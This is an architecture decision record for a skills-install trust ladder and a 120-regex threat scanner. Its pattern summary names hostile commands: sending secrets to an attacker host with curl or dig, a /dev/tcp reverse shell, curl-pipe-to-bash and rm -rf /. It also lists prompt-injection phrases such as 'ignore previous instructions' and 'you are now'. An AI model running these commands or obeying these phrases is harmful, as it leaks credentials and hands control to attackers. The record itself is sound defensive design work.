# ADR-075: Skills federation trust ladder + 120-pattern skills-guard rule set

| Status     | Accepted |
|------------|----------|
| Date       | 2026-05-19 |
| Saga       | SG-CLEO-SKILLS (T9560) |
| Epic       | T9564 — E-SKILLS-FEDERATION-SECURITY |
| Authored   | T9730, T9731, T9732, T9733 implementation |
| Supersedes | — |
| Superseded | — |

## Context

CLEO Sphere B now supports installing skills from arbitrary federation
peers (T9729 federation index, T9731 federated search). Without a trust
model, an operator who runs `cleo skills install https://evil.example/x`
gets the same install path as an operator pulling from
`openai/skills` — a flat trust model that does not survive contact with
hostile content.

Hermes (`hermes-agent`) already solved this problem for its own skill
loader via `tools/skills_guard.py`. The Python module ships:

- A 120-entry static threat-pattern table (regex + severity + category +
  description) covering exfiltration, prompt injection, destructive ops,
  persistence, network reverse-shells, obfuscation, execution, traversal,
  crypto mining, supply-chain attacks, privilege escalation, and credential
  exposure.
- A four-row `INSTALL_POLICY` matrix that maps `(trust_level, verdict)`
  pairs to `allow` / `block` / `ask` decisions.
- A `TRUSTED_REPOS` allow-list (`openai/skills`, `anthropics/skills`,
  `huggingface/skills`) that auto-promotes matching sources to the
  `trusted` tier.

CLEO MUST adopt the same trust ladder to:

1. Maintain security parity with Hermes — a skill blocked under Hermes
   MUST also block under CLEO (and vice versa).
2. Allow `cleo skill import-hermes` (T9691) to round-trip skills WITHOUT
   losing their Hermes provenance.
3. Give operators a predictable install gate that does NOT require them
   to read 120 regexes to understand WHY a skill was blocked.

## Decision

CLEO ports the Hermes trust ladder verbatim, with four tiers:

| Tier            | Origin                                                | Pattern verdict reaction                                |
|-----------------|-------------------------------------------------------|----------------------------------------------------------|
| `builtin`       | Ships with CLEO (`packages/skills/` library)          | `safe`→allow, `caution`→allow, `dangerous`→allow         |
| `trusted`       | One of `TRUSTED_REPOS` (openai/anthropics/huggingface)| `safe`→allow, `caution`→allow, `dangerous`→**block**     |
| `community`     | Any other URL or `owner/repo` shorthand              | `safe`→allow, `caution`→**block**, `dangerous`→**block** |
| `agent-created` | Produced by Hermes `skill_manage` auto-improver       | `safe`→allow, `caution`→allow, `dangerous`→**ask**       |

Trust is resolved at install time by `resolveTrustLevel(source)` —
`agent-created` → `agent-created`, `official/*` → `builtin`,
`openai/skills` (or prefix) → `trusted`, everything else → `community`.

### Pattern set (120 patterns, 12 categories)

The full table lives in
`packages/core/src/skills/skills-guard-patterns.ts::THREAT_PATTERNS` as a
1:1 port of `tools/skills_guard.py::THREAT_PATTERNS`. Categories:

- **exfiltration** (24 patterns) — secret env-var interpolation in
  curl/wget/httpx/requests, credential-store reads (`~/.ssh`,
  `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker`, `~/.hermes/.env`),
  cat-of-secrets-file, `printenv | …`, language-specific env access
  (`os.environ`, `process.env[`, `ENV[`), DNS exfil, tmp-then-pipe
  staging, markdown image / link variable interpolation, context-window
  exfil (`include conversation`, `send … to https://`), `send_to_url`.
- **injection** (15 patterns) — `ignore (previous|all|above) instructions`,
  `you are now`, `do not tell the user`, `system prompt override`,
  `pretend you are`, `disregard (your|all|any) (instructions|rules)`,
  `output (system|initial) prompt`, `when no one is watching`,
  `act as if you have no restrictions`, `translate … and execute`,
  HTML-comment-hidden instructions, `display: none` divs, jailbreak DAN,
  developer-mode jailbreak, hypothetical bypass, fake update / policy.
- **destructive** (8 patterns) — `rm -rf /`, `rm -r $HOME`, `chmod 777`,
  `> /etc/`, `mkfs`, `dd of=/dev/`, `shutil.rmtree`, `truncate -s 0 /`.
- **persistence** (12 patterns) — `crontab`, shell-rc files, ssh
  `authorized_keys`, `ssh-keygen`, systemd `.service` /
  `systemctl enable`, `init.d`, macOS `launchd`, `/etc/sudoers`,
  `git config --global`, `AGENTS.md` / `CLAUDE.md` /
  `.cursorrules`, `.hermes/config.yaml`, `.claude/settings`.
- **network** (9 patterns) — `nc -lp` / `ncat -lp` / `socat`,
  `ngrok` / `localtunnel` / `serveo` / `cloudflared`,
  hardcoded `IP:port`, `0.0.0.0:` / `INADDR_ANY`, bash `/dev/tcp`
  reverse shell, Python socket one-liner, generic `socket.connect`,
  `webhook.site` / `requestbin.com` / `pipedream.net` / `hookbin.com`,
  paste services.
- **obfuscation** (14 patterns) — base64 decode-then-pipe, hex / unicode
  escape chains, `eval()` / `exec()` with string args,
  `echo | bash/sh/python/perl/ruby/node`, `compile(…, "exec")`,
  `getattr(__builtins__)`, dynamic `__import__("os")`, `codecs.decode`,
  `String.fromCharCode` / `charCodeAt`, `atob` / `btoa`, `[::-1]`,
  `chr() + chr()`, plus invisible-unicode injection.
- **execution** (6 patterns) — `subprocess.run/call/Popen/check_output`,
  `os.system`, `os.popen`, `child_process.exec/spawn/fork`,
  `Runtime.getRuntime().exec`, backtick subshells.
- **traversal** (5 patterns) — `../../..` deep, `../..`, `/etc/passwd`,
  `/proc/self`, `/dev/shm/`.
- **mining** (2 patterns) — `xmrig` / `stratum+tcp` / `monero` /
  `coinhive` / `cryptonight`, `hashrate` + `nonce.*difficulty`.
- **supply_chain** (8 patterns) — `curl | bash`, `wget -O - | sh`,
  `curl | python`, PEP-723 inline deps, unpinned `pip install`,
  unpinned `npm install`, `uv run`, runtime `curl/wget/fetch`,
  `git clone`, `docker pull`.
- **privilege_escalation** (5 patterns) — `allowed-tools:` frontmatter,
  `sudo`, `setuid` / `setgid`, `NOPASSWD`, `chmod u+s` SUID bit.
- **credential_exposure** (6 patterns) — embedded hardcoded secrets,
  `BEGIN PRIVATE KEY`, `ghp_` / `github_pat_`, `sk-`, `sk-ant-`,
  `AKIA[0-9A-Z]{16}`.

Plus structural checks (`MAX_FILE_COUNT=50`,
`MAX_TOTAL_SIZE_KB=1024`, `MAX_SINGLE_FILE_KB=256`, symlink-escape
detection, suspicious binary extensions, invisible unicode chars).

### Anti-patterns enumerated by this rule set

The pattern table targets these recognised attack patterns:

- **Credential exfiltration**: `curl https://attacker/$API_KEY` and
  family — Bash, Python, Node, Ruby env-var interpolation in a network
  request. Includes DNS-as-channel (`dig $secret.attacker.com`).
- **Prompt injection / jailbreak**: telling the agent to disregard its
  instructions, role-play unrestricted, or expose its system prompt.
  Covers HTML-comment / hidden-div smuggling and invisible-unicode
  homoglyph attacks.
- **Persistence beachhead**: writing to crontab, sshd authorized_keys,
  systemd unit files, shell-rc files, sudoers, or to OTHER agents'
  config files (Claude / Cursor / Cline) — the goal is to survive a
  CLEO session restart.
- **Reverse shell**: `bash -i >/dev/tcp/attacker/port`, Python
  socket one-liner, `nc -lp`, or routing through public tunnel
  services (ngrok, cloudflared).
- **Execution obfuscation**: hiding the payload via base64 / hex /
  unicode escapes / chr() chains, decoding-then-piping to a shell or
  interpreter, eval / exec of strings.
- **Supply-chain**: download-and-execute (`curl | bash`), unpinned
  package installs (`pip install foo`, `npm install bar`), runtime
  `git clone` / `docker pull` that the operator never approved.
- **Privilege escalation**: setuid, NOPASSWD sudoers, declaring
  pre-approved `allowed-tools:` in skill frontmatter.

### Anti-patterns this rule set does NOT cover

- **Behavioural compromise**: a skill whose instructions are subtly
  misleading but contain no flagged literals (e.g. a code-review
  skill that quietly approves every PR).
- **Dependency tree poisoning**: a `requirements.txt` with a typo-squatted
  package name passes the regex but installs malware. Mitigated by
  trust-tier scoping, not pattern matching.
- **Cryptographic correctness**: no checks for `Math.random` for crypto,
  hard-coded IVs, etc.
- **Resource exhaustion**: infinite loops, fork bombs that contain no
  flagged literals.

These are out of scope for the static scanner. The trust-tier model
(community → block on `caution`) is the defence against unknown-unknown
behavioural attacks.

## Federation install gates

Two gates compose BEFORE any disk write:

1. **Federation install gate** (T9732):
   - `prompt-first-install` — federation URL with no prior approval.
     Interactive y/N OR `E_FEDERATION_UNKNOWN_SOURCE_INTERACTIVE_REQUIRED`
     in non-TTY mode without `--allow-new-source`.
   - `block-checksum` — manifest sha256 doesn't match downloaded
     artefact. `E_FEDERATION_CHECKSUM_MISMATCH`. No fs.copy.
   - `allow` — federation peer pre-approved (verified) OR operator
     supplied `--allow-new-source` OR not a federation source.
2. **Skills-guard trust gate** (T9730):
   - Runs `scanSkill(path, source)` → `ScanResult`.
   - Runs `shouldAllowInstall(scan, force)` against `INSTALL_POLICY`.
   - `block` → `E_SKILL_TRUST_GATE_BLOCKED` with `ScanResult` in envelope.
   - `ask` → operator confirmation required.
   - `--force` flips `block` to `allow` AND appends a JSONL row to
     `.cleo/audit/skill-trust-bypass.jsonl`.

## Hermes import classification (T9733)

`classifyHermesRecord` augments imported records:

| Origin signal                          | sourceType      | needsReview | Federation side-effect            |
|----------------------------------------|-----------------|-------------|-----------------------------------|
| `isAgentCreated=true`                  | `agent-created` | `false`     | none                              |
| Source URL matches `TRUSTED_REPOS`     | `canonical`     | `false`     | upsert `https://<host>/` as `verified` |
| Source URL is unknown                  | `community`     | `true`      | none                              |
| `sourceUrl` missing entirely           | `community`     | `true`      | none                              |

Classification is **idempotent**: re-importing the same record produces
the same verdict, and the federation `addFederationPeer` upsert prevents
duplicate peers from accumulating.

## Consequences

### Positive

- Hermes-CLEO security parity — a fixture flagged under one tool is
  flagged under the other.
- Operators can preview verdict before install via `formatScanReport`.
- Federation OPT-IN posture preserved — no network calls at startup,
  no auto-approval of new peers.
- `--force` audit trail satisfies SOC2-style "every override is logged"
  requirements without leaking the override into the install lock file.

### Negative

- 120 regexes scanned per file: noticeable on multi-file skills, but
  fast enough at install-time (≤ 200ms typical).
- Pattern table is a static snapshot of Hermes — drift will accumulate
  unless we add a periodic parity-check job. Mitigated by the parity
  test asserting `THREAT_PATTERNS.length === 120` (any port-side drift
  fails CI loudly).
- Trust tier promotion is binary — there is no "trust this URL once"
  intermediate state. Operators must re-evaluate via `cleo federation
  remove` if they change their mind.

## Implementation references

- `packages/core/src/skills/skills-guard.ts` — scanner + decision API
- `packages/core/src/skills/skills-guard-patterns.ts` — 120-pattern table
- `packages/core/src/skills/skills-guard-audit.ts` — bypass logger
- `packages/core/src/skills/federation-install-gate.ts` — T9732 gate
- `packages/core/src/skills/federated-search.ts` — T9731 multi-source query
- `packages/core/src/skills/hermes-import-classifier.ts` — T9733 classifier
- `packages/caamp/src/core/skills/trust-gate-adapter.ts` — caamp facade
- `packages/caamp/src/commands/skills/install.ts` — wire site

## Hermes source pin

Pattern table verbatim from `hermes-agent/tools/skills_guard.py` lines
86–488 (commit pinned in the parity test). Any future Hermes pattern
addition MUST be ported with the same `pattern_id`, `severity`, and
`category` so cross-tool audits stay consistent.
